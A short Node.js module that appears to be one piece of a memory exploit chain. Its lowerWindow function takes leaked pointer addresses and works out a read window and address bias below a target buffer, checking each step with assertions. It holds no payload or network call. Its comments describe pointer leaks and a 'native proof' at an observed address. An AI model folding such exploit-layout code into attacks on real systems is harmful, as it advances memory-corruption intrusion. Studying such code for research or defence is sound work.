// Keep the native proof at an observed buffer address while leaving room below
// it in the initial mapping. The lower address is a search hypothesis only.
const assert = require('node:assert/strict');
const {plan} = require("../memory/signed-cache-plan.cjs");

function lowerWindow(target, storageSize, cycle, pointers) {
  assert.ok(pointers.length && pointers.every(address => Number.isSafeInteger(address) &&
    address >= 2 ** 32 && address < 2 ** 39 && address % 0x4000 === 0));
  const low = Math.min(...pointers);
  // The first leak may expose only the middle of the pool. Keep a broad
  // backward window without assuming that its lowest pointer is a boundary.
  const maximumPrefix = Math.min(0x4000000, storageSize - 0x8000, target - 2 ** 32);
  const prefix = Math.floor(maximumPrefix / cycle) * cycle;
  const proposedStart = target - prefix;
  assert.ok(prefix > 0 && prefix + 0x4000 < storageSize);
  const result = plan(target - prefix, storageSize, cycle);
  result.target = target;
  result.readOffset += prefix;
  assert.equal(result.addressBias + result.readOffset, target);
  assert.equal(Math.floor(result.readOffset / 0x4000) * 0x4000 % cycle, 0);
  assert.ok(result.readOffset + 0x4000 <= storageSize);
  assert.equal(BigInt.asUintN(64, BigInt(result.base) + BigInt(result.readOffset) -
    BigInt(result.entryOffset)), BigInt(target));
  result.lowerWindow = {lowestObservedPointer: low, proposedStart, prefix,
    addressBias: result.addressBias,
    qualification: 'Lower mapping has not been read. Proof remains at the observed buffer address.'};
  return result;
}

module.exports = {lowerWindow};
